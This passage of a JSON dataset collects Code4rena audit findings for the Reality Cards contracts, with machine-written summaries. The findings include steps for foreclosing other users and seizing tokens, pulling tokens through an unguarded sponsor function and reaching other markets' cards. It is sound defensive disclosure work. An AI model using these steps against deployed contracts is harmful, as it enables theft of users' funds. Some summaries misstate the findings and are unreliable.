      "content": "## Handle\n\nmaplesyrup\n\n\n## Vulnerability details\n\n## Impact\n\n2 - Medium Risk \n       - Possible loss or lock of funds found in a function in the contract\n\n## Proof of Concept\n\nWhen running the analyzer code, the following functions were found in RCOrderbook.sol to possibly lock funds due to it being a payable function with no withdraw function associated.\n\n----------------------------\nContract locking ether found:\n\n// contracts/RCOrderbook.sol \n// line(s) 15-876\n\nContract RCOrderbook \n\nhas payable functions: \n\n// contracts/lib/NativeMetaTransaction.sol\n// line(s) 31-67\t\n\nNativeMetaTransaction.executeMetaTransaction(address,bytes,bytes32,bytes32,uint8)\n\nBut does not have a function to withdraw the funds\n--------------------------\n\nAccording to Slither analyzer detector documentation (https://github.com/crytic/slither/wiki/Detector-Documentation#contracts-that-lock-ether)\n\nPossible functions that receive funds with the payable attribute must have a withdraw function to secure that funds can be sent out from the function or remove payable attribute.\n\nAlthough the function may not receive funds directly, there should be a withdraw function added to ensure that information needed from the function can be withdrawn safely or do not include payable attribute.\n\nConsole Output (Slither log):\n\nINFO:Detectors:\nContract locking ether found:\n\tContract RCOrderbook (contracts/RCOrderbook.sol#15-876) has payable functions:\n\t - NativeMetaTransaction.executeMetaTransaction(address,bytes,bytes32,bytes32,uint8) (contracts/lib/NativeMetaTransaction.sol#31-67)\n\tBut does not have a function to withdraw the ether\nReference: https://github.com/crytic/slither/wiki/Detector-Documentation#contracts-that-lock-ether\n\n\n## Tools Used\n\nSolidity Compiler 0.8.4\nHardhat v2.3.3\nSlither v0.8.0\n\nCompiled, Tested, Deployed contracts on a local hardhat network.\n\nRan Slither-analyzer for further detecting and testing.\n\n## Recommended Mitigation Steps\n(Worked best under python venv)\n1. Clone Project Repository\n2. Run Project against Hardhat network;\n     compile and run default test on contracts.\n3. Installed slither analyzer:\n    https://github.com/crytic/slither\n4. Ran [$ slither .] against RCOrderbook.sol and all contracts to verify results",
      "summary": "\nA bug report has been filed regarding a vulnerability found in the RCOrderbook.sol contract. The vulnerability has been assessed as having a medium risk, as it could potentially lead to a loss or lock of funds. The Slither analyzer detected a payable function without a withdraw function associated, which can be used to lock funds. The report outlines the tools used to detect the vulnerability, as well as recommended mitigation steps. \n\nThe tools used include the Solidity Compiler 0.8.4, Hardhat v2.3.3, and Slither v0.8.0. The project was cloned, compiled, tested, and deployed on a local Hardhat network, after which the Slither analyzer was used to further detect and test the contracts. The Slither log showed a contract locking ether found, with the NativeMetaTransaction.executeMetaTransaction function having the payable attribute without a withdraw function.\n\nThe recommended mitigation steps include cloning the project repository, running it against the Hardhat network to compile and run the default tests on the contracts, installing the Slither analyzer, and then running it against the RCOrderbook.sol and all contracts to verify the results. This will help to identify any potential vulnerabilities and take steps to mitigate them.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/43",
      "tags": [],
      "finders": [
        "maplesyrup (heiho1  thisguy__)"
      ]
    },
    {
      "id": "295",
      "title": "[M-05] RCFactory.createMarket() does not enforce _timestamps and _timestamps being larger than _timestamps, even though proper functioning requires them to be so",
      "impact": "MEDIUM",
      "content": "## Handle\n\njvaqa\n\n\n## Vulnerability details\n\nRCFactory.createMarket() does not enforce _timestamps[1] and _timestamps[2] being larger than _timestamps[0], even though proper functioning requires them to be so.\n\n## Impact\n\nIRCMarket defines a sequence of events that each market should progress through sequentially, CLOSED, OPEN, LOCKED, WITHDRAW. // [1]\n\nThe comments explicitly state that _incrementState() should be called \"thrice\". // [2]\n\nHowever, it is possible to create a market where these events do not occur sequentially.\n\nYou can create a market where the marketOpeningTime is later than the marketLockingTime and oracleResolutionTime.\n\nThis is because although RCFactory checks to ensure that _timestamps[2] is greater than _timestamps[1], it does not check to ensure that _timestamps[1] is greater than _timestamps[0]. // [3]\n\nThis is also because although RCFactory checks to ensure that _timestamps[0] is equal to or greater than block.timestamp, it makes no check for a minimum value for _timestamps[1] or _timestamps[2], or a relative check between the value of _timestamps[0] and _timestamps[1]. // [4]\n\nThus, you can create a market where the marketLockingTime and the oracleResolutionTime occur before the marketOpeningTime.\n\n## Proof of Concept\n\nWhen calling RCFactory.createMarket(), Alice can supply 0 as the argument for _timestamps[1] and _timestamps[2], and any value equal to or greater than block.timestamp for _timestamps[0]. // [5]\n\n## Recommended Mitigation Steps\n\nAdd the following check to RCFactory.createMarket():\n\nrequire(\n    _timestamps[0] < _timestamps[1],\n    \"market must begin before market can lock\"\n);\n\n[1] https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/interfaces/IRCMarket.sol#L7\n\n[2] https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L1093\n\n[3] https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L539\n\n[4] https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L521\n\n[5] https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L468",
      "summary": "\nThis bug report is about the RCFactory.createMarket() function in the Reality Cards project. The function does not enforce the _timestamps[1] and _timestamps[2] values to be larger than _timestamps[0], which is necessary for the proper functioning of the market. This means that it is possible to create a market where the marketOpeningTime is later than the marketLockingTime and oracleResolutionTime. \n\nThe impact of this bug is that it is possible to create a market where the events do not occur sequentially, as they should. This is because RCFactory does not check to ensure that _timestamps[1] is greater than _timestamps[0], and there is no minimum value for _timestamps[1] or _timestamps[2], or a relative check between the value of _timestamps[0] and _timestamps[1].\n\nThe proof of concept for this bug is that when calling RCFactory.createMarket(), Alice can supply 0 as the argument for _timestamps[1] and _timestamps[2], and any value equal to or greater than block.timestamp for _timestamps[0].\n\nThe recommended mitigation step for this bug is to add a check to RCFactory.createMarket() to ensure that _timestamps[0] is less than _timestamps[1]. This will ensure that the marketOpeningTime is before the marketLockingTime and oracleResolutionTime.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/61",
      "tags": [],
      "finders": [
        "0xRajeev",
        "paulius.eth  shw",
        "jvaqa"
      ]
    },
    {
      "id": "294",
      "title": "[M-04] minRentalDayDivisor can be different between markets and treasury",
      "impact": "MEDIUM",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe minRentalDayDivisor is defined in RCTreasury.sol and copied to each market.\nThe minRentalDayDivisor can be updated via setMinRental, but then it isn't updated in the already created market.\n\nTo calculate the minimum rent time, in function withdrawDeposit of RCTreasury.sol, the latest version of minRentalDayDivisor is used, which could be different than the values in the market.\nSo the markets will calculate the minimum rent time different.\nThis could lead to unexpected results\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCMarket.sol#L191\nfunction initialize(\n     ...\n        minRentalDayDivisor = treasury.minRentalDayDivisor();\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L322\n function withdrawDeposit(uint256 _amount, bool _localWithdrawal)\n...\n  require( user[_msgSender].bidRate == 0 || block.timestamp - (user[_msgSender].lastRentalTime) > uint256(1 days) / minRentalDayDivisor, \"Too soon\");\n..\n if ( user[_msgSender].bidRate != 0 &&  user[_msgSender].bidRate / (minRentalDayDivisor) >  user[_msgSender].deposit ) {\n..\n\n// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L169\n  function setMinRental(uint256 _newDivisor) public override onlyOwner {\n        minRentalDayDivisor = _newDivisor;\n    }\n\n## Tools Used\n\n## Recommended Mitigation Steps\nEither accept and document the risk or change to code to prevent this from happening.",
      "summary": "\nThis bug report is about a vulnerability in the minRentalDayDivisor in the Realitycards project. The minRentalDayDivisor is defined in RCTreasury.sol and copied to each market. The minRentalDayDivisor can be updated via setMinRental, but then it isn't updated in the already created market. This means that the markets will calculate the minimum rent time differently than the latest version of minRentalDayDivisor, leading to unexpected results. The code used in the report is provided, as well as a recommended mitigation step of either accepting and documenting the risk or changing the code to prevent it from happening.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/31",
      "tags": [],
      "finders": [
        "maplesyrup (heiho1  thisguy__)  paulius.eth",
        "gpersoon"
      ]
    },
    {
      "id": "293",
      "title": "[M-03] Missing balancedBooks modifier could result in failed system insolvency detection",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThe balancedBooks modifier is used to “check that funds haven't gone missing during this function call” and is applied to deposit, withdrawDeposit, payRent, payout and sponsor Treasury functions which move funds in and out of the Treasury or adjust its market/user balances.\n\nHowever, this modifier is missing on refundUser() and topupMarketBalance() functions which also perform similar actions.\n\nImpact: Any miscalculations in these functions will lead to the system becoming insolvent.\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L123-L132\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L447-L450\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L372\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L282\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L325\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L409\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L432\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L469\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd modifier to the two functions above where it is missing.",
      "summary": "\nThis bug report is about a vulnerability in the RealityCards Treasury contract. The vulnerability is that the balancedBooks modifier, which is used to check that funds haven't gone missing during a function call, is missing from the refundUser() and topupMarketBalance() functions. This means that any miscalculations in these functions can lead to the system becoming insolvent. The proof of concept of this vulnerability can be found on the given Github link. The bug was found through manual analysis. The recommended mitigation step is to add the modifier to the two functions where it is missing.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/112",
      "tags": [],
      "finders": [
        "0xRajeev",
        "gpersoon  paulius.eth"
      ]
    },
    {
      "id": "292",
      "title": "[M-02] Critical uberOwner address changes should be a two-step process",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nAs specified, uberOwners of Factory, Orderbook and Treasury have the highest privileges in the system because they can upgrade contracts of market, Nfthub, order book, treasury, token and factory which form the critical components of the protocol.\n\nThe contracts allow for uberOwners to be changed to a different address from the contract owner/deployer using the changeUberOwner() function which is callable by the current uberOwner. While this function checks for zero-address, there is no validation of the new address being correct. If the current uberOwner incorrectly uses an invalid address for which they do not have the private key, then the system gets locked because the uberOwner cannot be corrected and none of the other functions that require uberOwner caller can be executed.\n\nImpact: The current uberOwner uses a non-zero but incorrect address as the new uberOwner. This gets set and now the system is locked and none of the uberOwner-only callable functions are callable. This error cannot be fixed either and will require redeployment of contracts which will mean that all existing markets have to be terminated. The system will have to be shut and restarted completely from scratch which will take a reputation hit and have a serious technical and business impact.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards#mortar_board-governance-mortar_board\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L444-L449\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCOrderbook.sol#L117-L121\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L264-L268\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nChange the single-step change of uberOwner address to a two-step process where the current uberOwner first approves a new address as a pendingUberOwner. That pendingUberOwner has to then claim the ownership in a separate transaction which cannot be done if they do not have the correct private key. An incorrectly set pendingUberOwner can be reset by changing it again to the correct one who can then successfully claim it in the second step.",
      "summary": "\nA bug has been discovered in the RealityCards protocol where the uberOwners of Factory, Orderbook and Treasury have the highest privileges in the system. The contracts allow for uberOwners to be changed to a different address from the contract owner/deployer using the changeUberOwner() function, which is callable by the current uberOwner. If the current uberOwner incorrectly uses an invalid address for which they do not have the private key, then the system gets locked because the uberOwner cannot be corrected and none of the other functions that require uberOwner caller can be executed. This error cannot be fixed and will require redeployment of contracts which will mean that all existing markets have to be terminated and the system will have to be shut and restarted completely from scratch.\n\nThe bug was discovered through manual analysis and a proof of concept is available at the given Github links. The recommended mitigation step is to change the single-step change of uberOwner address to a two-step process. The current uberOwner first approves a new address as a pendingUberOwner. That pendingUberOwner has to then claim the ownership in a separate transaction which cannot be done if they do not have the correct private key. An incorrectly set pendingUberOwner can be reset by changing it again to the correct one who can then successfully claim it in the second step.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/105",
      "tags": [],
      "finders": [
        "gpersoon  [adlamo](https://twitter.com/a_delamo)._",
        "0xRajeev"
      ]
    },
    {
      "id": "291",
      "title": "[M-01] payout doesn’t fix isForeclosed state",
      "impact": "MEDIUM",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe function payout of RCTreasury.sol doesn't undo the isForeclosed state of a user.\nThis would be possible because with a payout a user will receive funds so he can lose his isForeclosed status.\n\nFor example the function refundUser does check and update the isForeclosed status.\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L429\n function payout(address _user, uint256 _amount)  external override balancedBooks onlyMarkets returns (bool) {\n        require(!globalPause, \"Payouts are disabled\");\n        assert(marketPot[msgSender()] >= _amount);\n        user[_user].deposit += SafeCast.toUint128(_amount);\n        marketPot[msgSender()] -= _amount;\n        totalMarketPots -= _amount;\n        totalDeposits += _amount;\n        emit LogAdjustDeposit(_user, _amount, true);\n        return true;\n    }\n\n// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L447 \nfunction refundUser(address _user, uint256 _refund)  external override onlyMarkets {\n     ...\n        if ( isForeclosed[_user] && user[_user].deposit > user[_user].bidRate / minRentalDayDivisor )  {\n            isForeclosed[_user] = false;\n            emit LogUserForeclosed(_user, false);\n        }\n\n## Tools Used\n\n## Recommended Mitigation Steps\nCheck and update the isForeclosed state in the payout function",
      "summary": "\nThis bug report describes an issue with the function payout of RCTreasury.sol, which is part of a project on GitHub. The issue is that the function does not undo the isForeclosed state of a user, meaning that a user can receive funds and lose their isForeclosed status. To demonstrate this, the report includes two code snippets from the project. The first snippet is of the function payout, which does not include any checks or updates of the isForeclosed state. The second snippet is of the function refundUser, which does include those checks and updates.\n\nThe recommended mitigation step for this issue is to check and update the isForeclosed state in the payout function. This should be done in order to ensure that users with isForeclosed status cannot receive funds and lose that status.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/28",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "290",
      "title": "[H-04] Anyone can affect deposits of any user and turn the owner of the token",
      "impact": "HIGH",
      "content": "_Submitted by [a_dlamo](https://twitter.com/a_delamo)_\n\nOn `RCTreasury`, we have the method `collectRentUser`. This method is public, so anyone can call it using whatever user and whatever timestamp.\nSo, calling this method using `user = XXXXX` and `_timeToCollectTo = type(uint256).max)`, would make `isForeclosed[user] = true`.\n\nSee [issue page](https://github.com/code-423n4/2021-06-realitycards-findings/issues/119) for referenced code\n\nNow, we can do the same for all the users bidding for a specific token.\nFinally, I can become the owner of the token by just calling `newRental` and using a small price. `newRental` will iterate over all the previous bid and will remove them because there are foreclosed.\n\nRecommend that `collectRentUser` should be private and create a new public method with `onlyOrderbook` modifier.\n\n**[Splidge (Reality Cards) confirmed](https://github.com/code-423n4/2021-06-realitycards-findings/issues/119#issuecomment-863945050):**\n > I like this.\n> Although I might change the mitigation steps. I like keeping `collectRentUser` available to use, we can call it from our bot and it'll help keep user deposits updated in a timely manner for the frontend. I think I'll just add in\n> ```solidity\n> require(_timeToCollectTo <= block.timestamp, \"Can't collect future rent\")\n> ```\n\n**[mcplums (Reality Cards) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/119#issuecomment-864033361):**\n > Yeah this is a real doozie, very happy this one was spotted!! Thanks @a_delamo :)\n\n**[Splidge (Reality Cards) resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/119#issuecomment-865027036):**\n > Fix implemented [here](https://github.com/RealityCards/RealityCards-Contracts/commit/eb344de042217de28283c12281310b74f57a55f1)\n\n",
      "summary": "\nThis bug report is about the vulnerability of the public method `collectRentUser` on `RCTreasury`. By calling this method with a specific user and maximum uint256, `isForeclosed` for the user would be set to true. This would allow the caller to become the owner of a token by calling `newRental` with a small price, as it would iterate over all the previous bids and remove them due to being foreclosed. The recommended mitigation step is to make `collectRentUser` private and create a new public method with the `onlyOrderbook` modifier.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/119",
      "tags": [],
      "finders": [
        "[adlamo](https://twitter.com/a_delamo)_"
      ]
    },
    {
      "id": "289",
      "title": "[H-03] anyone can call function sponsor",
      "impact": "HIGH",
      "content": "## Handle\n\npauliax\n\n\n## Vulnerability details\n\n## Impact\nThis function sponsor should only be called by the factory, however, it does not have any auth checks, so that means anyone can call it with an arbitrary _sponsorAddress address and transfer tokens from them if the allowance is > 0:\n    /// @notice ability to add liqudity to the pot without being able to win.\n    /// @dev called by Factory during market creation\n    /// @param _sponsorAddress the msgSender of createMarket in the Factory\n    function sponsor(address _sponsorAddress, uint256 _amount)\n        external\n        override\n    {\n        _sponsor(_sponsorAddress, _amount);\n    }\n\n## Recommended Mitigation Steps\nCheck that the sender is a factory contract.",
      "summary": "\nThis bug report is about a vulnerability in a function called \"sponsor\" which should only be called by the factory but does not have any authentication checks. This means anyone can call it with an arbitrary sponsor address and transfer tokens from them if the allowance is greater than 0. The recommended mitigation step for this vulnerability is to check that the sender is a factory contract.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/40",
      "tags": [
        "Access Control"
      ],
      "finders": [
        "cmichel",
        "shw",
        "0xRajeev",
        "paulius.eth"
      ]
    },
    {
      "id": "288",
      "title": "[H-02] Can access cards of other markets",
      "impact": "HIGH",
      "content": "_Submitted by [gpersoon](https://twitter.com/gpersoon)_\n\nWithin `RCMarket.sol` the functions `ownerOf` and `onlyTokenOwner` do not check if the `_cardId/_token` is smaller than `numberOfCards`. So it's possible to supply a larger number and access cards of other markets.\nThe most problematic seems to be `upgradeCard`. Here the check for `isMarketApproved` can be circumvented by trying to move the card via another market.\n\nYou can still only move cards you own.\n```solidity\n// https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCMarket.sol#L338\n    function ownerOf(uint256 _cardId) public view override returns (address) {\n        uint256 _tokenId = _cardId + totalNftMintCount; // doesn't check if _cardId < numberOfCards\n        return nfthub.ownerOf(_tokenId);\n    }\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCMarket.sol#L313\n  modifier onlyTokenOwner(uint256 _token) {\n        require(msgSender() == ownerOf(_token), \"Not owner\"); // _token could be higher than numberOfCards,\n        _;\n    }\n\nfunction upgradeCard(uint256 _card) external onlyTokenOwner(_card) {   // _card  could be higher than numberOfCards,\n    _checkState(States.WITHDRAW);\n    require(\n        !factory.trapIfUnapproved() ||\n            factory.isMarketApproved(address(this)),   // this can be circumvented by calling the function via another market\n        \"Upgrade blocked\"\n    );\n    uint256 _tokenId = _card + totalNftMintCount;    // _card  could be higher than numberOfCards, thus accessing a card in another market\n    _transferCard(ownerOf(_card), address(this), _card); // contract becomes final resting place\n    nfthub.withdrawWithMetadata(_tokenId);\n    emit LogNftUpgraded(_card, _tokenId);\n}\n```\n\nRecommend adding the following to `ownerOf`:\n`require(_card < numberOfCards, \"Card does not exist\");`\n\n**[Splidge (Reality Cards) confirmed but recommended *higher* severity](https://github.com/code-423n4/2021-06-realitycards-findings/issues/11#issuecomment-860545086):**\n > I would assign this a higher severity level, I think it should be 3(High Risk) as this can be used to steal assets. An NFT being an asset as defined in the warden judging criteria found [here](https://docs.code4rena.com/roles/wardens/judging-criteria).\n>\n> It is planned that eventually market creation will be opened up to anyone. There are several steps along this path towards opening up market creation:\n> 1. only the Factory `owner` can create markets\n> 2. Governors will be assigned who also have the ability to create markets\n> 3. Anybody can be allowed to create markets by calling `changeMarketCreationGovernorsOnly`\n> 4. NFTs allowed to be created (or more accurately not burned on market completion) by anyone by calling `changeTrapCardsIfUnapproved`\n>\n> The key here is that even in step 3 where anybody can create a market, the market will still require Governor approval for it to be displayed in the UI and for the NFT to be allowed to be upgraded. It is here in step 3 that `upgradeCard` could be called on an approved market in order to move a card from an unapproved market.\n\n**[mcplums (Reality Cards) confirmed](https://github.com/code-423n4/2021-06-realitycards-findings/issues/11#issuecomment-864044517):**\n > Agreed, this indeed should have a higher severity- fantastic catch @gpersoon!!\n\n**[Splidge (Reality Cards) resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/11#issuecomment-864892792):**\n> Fixed [here](https://github.com/RealityCards/RealityCards-Contracts/commit/1f395f8cb415a1114cae60eb42c75c6539dfec73)\n> Impressed also with the simplicity of the solution.\n\n**[dmvt (Judge) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/11#issuecomment-877651728):**\n > Agree with the higher severity\n\n",
      "summary": "\nThis bug report is about a vulnerability that exists within the RCMarket.sol code in the functions ownerOf and onlyTokenOwner. The vulnerability allows for users to supply a larger number than the actual number of cards, which could give them access to cards of other markets. The most problematic is the upgradeCard function, which can be circumvented by trying to move the card via another market. The proof of concept provided in the report shows how the code can be manipulated to access cards of other markets.\n\nThe recommended mitigation steps for this vulnerability are to add a check to the ownerOf function that requires the _cardId to be less than the numberOfCards. This will prevent users from supplying a larger number than the actual number of cards and accessing cards of other markets.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/11",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "287",
      "title": "[H-01] Unchecked ERC20 transfers can cause lock up",
      "impact": "HIGH",
      "content": "_Submitted by [axic](https://twitter.com/alexberegszaszi), also found by [gpersoon](https://twitter.com/gpersoon), [pauliax](https://twitter.com/SolidityDev), [Jmukesh](https://twitter.com/MukeshJ_eth), [a_delamo](https://twitter.com/a_delamo), [s1m0](https://twitter.com/_smonica_), [cmichel](https://twitter.com/cmichelio), and [shw](https://github.com/x9453)_\n\nSome major tokens went live before ERC20 was finalized, resulting in a discrepancy whether the transfer functions should (A) return a boolean or (B) revert/fail on error. The current best practice is that they should revert, but return “true” on success. However, not every token claiming ERC20-compatibility is doing this — some only return true/false; some revert, but do not return anything on success. This is a well known issue, heavily discussed since mid-2018.\n\nToday many tools, including OpenZeppelin, offer [a wrapper for “safe ERC20 transfer”](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol):\n\nRealityCards is not using such a wrapper, but instead tries to ensure successful transfers via the `balancedBooks` modifier:\n\n```solidity\nmodifier balancedBooks {\n    _;\n    // using >= not == in case anyone sends tokens direct to contract\n    require(\n        erc20.balanceOf(address(this)) >=\n            totalDeposits + marketBalance + totalMarketPots,\n        \"Books are unbalanced!\"\n    );\n}\n```\n\nThis modifier is present on most functions, but is missing on `topupMarketBalance`:\n```solidity\nfunction topupMarketBalance(uint256 _amount) external override {\n    erc20.transferFrom(msgSender(), address(this), _amount);\n    if (_amount > marketBalanceDiscrepancy) {\n        marketBalanceDiscrepancy = 0;\n    } else {\n        marketBalanceDiscrepancy -= _amount;\n    }\n    marketBalance += _amount;\n}\n```\n\nIn the case where an ERC20 token which is not reverting on failures is used, a malicious actor could call `topupMarketBalance` with a failing transfer, but also move the value of `marketBalance` above the actual holdings. After this, `deposit`, `withdrawDeposit`, `payRent`, `payout`, `sponsor`, etc. could be locked up and always failing with “Books are unbalanced”.\n\nAnyone can call `topupMarketBalance` with some unrealistically large number, so that `marketBalance` does not overflow, but is above the actually helping balances. This is only possible if the underlying ERC20 used is not reverting on failures, but is returning “false” instead.\n\n**Recommended Steps**:\n1. Use something like OpenZeppelin’s `SafeERC20`\n2. Set up an allow list for tokens, which are knowingly safe\n3. Consider a different approach to the `balancedBooks` modifier\n\n**[Splidge (Reality Cards) confirmed](https://github.com/code-423n4/2021-06-realitycards-findings/issues/2#issuecomment-860518142):**\n > The particular ERC20 contracts we are using don't have this issue. However for futureproofing in the event we change ERC20 tokens we will implement the recommended mitigation 1 and start using OpenZeppelin’s SafeERC20.\n\n**[Splidge (Reality Cards) resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/2#issuecomment-863130135):**\n > Fix implemented [here](https://github.com/RealityCards/RealityCards-Contracts/commit/6b2c25bea664efe0f573d8d1b8118ecad19a47ff)\n\n",
      "summary": "\nA bug report has been filed regarding the discrepancy of whether the transfer functions of the ERC20 token should return a boolean or revert/fail on error. It has been discussed since mid-2018 that the best practice is to revert but return true on success. However, some tokens are not following this protocol, and this has caused a vulnerability in RealityCards. The `balancedBooks` modifier is present on most functions, but is missing on `topupMarketBalance`. This means that a malicious actor can call `topupMarketBalance` with a failing transfer, but also move the value of `marketBalance` above the actual holdings, resulting in the “Books are unbalanced” error. To mitigate this issue, OpenZeppelin’s SafeERC20 should be used, an allow list for tokens should be set up, and a different approach to the `balancedBooks` modifier should be considered.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/2",
      "tags": [
        "SafeTransfer",
        "ERC20"
      ],
      "finders": [
        "a_delamo",
        "s1m0",
        "gpersoon",
        "pauliax",
        "cmichel",
        "axic",
        "shw_",
        "[Jmukesh](https://twitter.com/MukeshJeth)"
      ]
    },
    {
      "id": "42188",
      "title": "[G-04] Gas optimization for `StakingTokenProvider.nameForStakingToken`",
      "impact": "GAS",
      "content": "\n`StakingTokenProvider.nameForStakingToken`: `if (keccak256(abi.encode(_pairedPrefix)) == keccak256(abi.encode(address(0)))) ` can be simplified to `if(bytes(_pairedPrefix).length== 0)`\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/49)**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/49",
      "tags": [],
      "finders": []
    },
    {
      "id": "42187",
      "title": "[M-08] A malicious receiver can cause another receiver to lose out on distributed fees by returning `false` for `tokensReceived` when `receiveRewards` is called on their receiver contract.",
      "impact": "MEDIUM",
